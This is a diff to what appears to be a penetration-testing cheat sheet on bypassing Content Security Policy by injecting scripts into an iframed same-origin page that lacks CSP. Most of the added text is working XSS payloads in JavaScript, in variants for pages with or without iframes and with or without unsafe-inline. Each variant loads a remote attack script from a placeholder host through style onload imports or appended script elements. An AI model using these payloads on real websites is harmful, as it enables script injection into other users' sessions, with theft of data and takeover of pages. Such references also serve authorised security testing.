@@ -13,8 +13,10 @@ First of all you can analyze the policy using the csp-evaluator by Google to qui
 CSP can be defined both as HTTP responese headers, and included inside `<meta>` like the following:
 
 ``` html
-<meta http-equiv="Content-Security-Policy" content="{{ csp-policy default-src 'self' cdn.example.com;}}">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' cdn.example.com;">
 ```
+
+With HTML injection you could try to override declarations, but if you can't do that, a few of the following examples might help.
 
 ## Abusing `window.name`
 
@@ -30,10 +32,12 @@ If you find an XSS vector in one resource but it's protected by CSP, there might
 
 The idea is that, if you pop an XSS on the `/search` resource, you can use that to iframe and inject arbitrary scripts on a <smart-variable variable="non-protected-page" default-value="/robots.txt"></smart-variable> resource without CSP.
 
+### Page has no iframes
+
 A fairly short XSS payload would be the following:
 
-<smart-tabs variable="js-minified" :tabs="{'regular': 'Regular', 'minified': 'Minified'}">
-<template v-slot:regular>
+<smart-tabs variable="unsafe-inline" :tabs="{'yes': 'Allows unsafe-inline', 'no': 'Doesn\'t allow unsafe-inline'}">
+<template v-slot:yes>
 
 ``` js
 f = document.createElement("iframe")
@@ -42,10 +46,12 @@ f.onload = () => f.contentDocument.body.innerHTML = "&lt;style onload=import('{{
 ```
 
 </template>
-<template v-slot:minified>
+<template v-slot:no>
 
 ``` js
-f=document.createElement("iframe"),document.body.appendChild(f).src="{{ non-protected-page /robots.txt }}",f.onload=()=>f.contentDocument.body.innerHTML="&lt;style onload=import('{{ remote-script //localhost:8888/attack.js }}')>"
+f = document.createElement("iframe")
+document.body.appendChild(f).src = "{{ non-protected-page /robots.txt }}"
+f.onload = () => f.contentDocument.body.appendChild(document.createElement("script")).src = '{{ remote-script //localhost:8888/attack.js }}'
 ```
 
 </template>
@@ -53,11 +59,57 @@ f=document.createElement("iframe"),document.body.appendChild(f).src="{{ non-prot
 
 I'm using `<style onload=import` to load the script on the non-protected resource because it's a fairly short payload, but you can try any other payload.
 
+### Page already has iframes
+
+You the page you are injection on might already have an iframe; which reduces the payload size, specially if the source loaded by the iframe is not protected by CSP.
+
+<smart-tabs variable="unsafe-inline" :tabs="{'yes': 'Allows unsafe-inline', 'no': 'Doesn\'t allow unsafe-inline'}">
+<template v-slot:yes>
+
+``` js
+window.frames[{{ frame-number 0 }}].onload = (e) => e.target.body.innerHTML = "&lt;style onload=import('{{ remote-script //localhost:8888/attack.js }}')>"
+```
+
+</template>
+<template v-slot:no>
+
+``` js
+window.frames[{{ frame-number 0 }}].onload = (e) => e.target.body.appendChild(document.createElement('script')).src='{{ remote-script //localhost:8888/attack.js }}'
+```
+
+</template>
+</smart-tabs>
+
+If you were to need a different source on the `iframe` your payload could look like the following following:
+
+<smart-tabs variable="unsafe-inline" :tabs="{'yes': 'Allows unsafe-inline', 'no': 'Doesn\'t allow unsafe-inline'}">
+<template v-slot:yes>
+
+``` js
+f = window.frames[{{ frame-number 0 }}]
+f.src = "{{ non-protected-page /robots.txt }}"
+f.onload = (e) => e.target.body.innerHTML = "&lt;style onload=import('{{ remote-script //localhost:8888/attack.js }}')>"
+```
+
+</template>
+<template v-slot:no>
+
+``` js
+f = window.frames[{{ frame-number 0 }}]
+f.src = "{{ non-protected-page /robots.txt }}"
+f.onload = (e) => e.target.body.appendChild(document.createElement('script')).src='{{ remote-script //localhost:8888/attack.js }}'
+```
+
+</template>
+</smart-tabs>
+
 > Iframes have to be allowed for the resource, but if it has no CSP or overly-permissive CSP, it's unlikely that iframing is disallowed from the same origin.
 
 ## Abusing `postMessage`
 
-Less of a pain to use than `window.name`, can be used in environments with a not as restrictive CSP. As an example, if `script-src` is restricted, it would be possible to load scripts by passing code through `postMessage`
+Less of a pain to use than `window.name`, can be used in environments with a not as restrictive CSP. As an example, if `script-src` is restricted, it would be possible to load scripts by passing code through `postMessage`.
+
+The idea is that you might not be able to load scripts from random sources, but you might be able to iframe random sources.
 
 > Should work on any modern browser if allowed through the website's Content Security Policy
 
